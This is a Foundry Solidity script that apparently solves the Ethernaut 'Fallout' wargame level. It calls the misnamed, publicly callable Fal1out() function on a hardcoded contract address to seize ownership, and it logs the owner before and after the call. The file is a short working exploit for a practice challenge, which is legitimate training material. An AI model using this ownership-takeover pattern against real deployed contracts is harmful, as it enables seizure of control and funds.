// SPDX-License-License: UNLICENSED
pragma solidity ^0.6.12;

import "@openzeppelin/contracts/math/SafeMath.sol";
import { Script } from "forge-std/Script.sol";
import { Fallout } from "../src/Fallout.sol";
import "forge-std/console.sol";

contract FalloutSolution is Script {
    Fallout public falloutInstance = Fallout(payable(0x74A7296177FC771Cf1224297ED47F7a763166dbC));

    function run() external {
        uint256 pk = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(pk);

        console.log("Owner address before: ", falloutInstance.owner());
        falloutInstance.Fal1out(); // Call without sending ether
        console.log("Owner address after: ", falloutInstance.owner());

        vm.stopBroadcast();
    }
}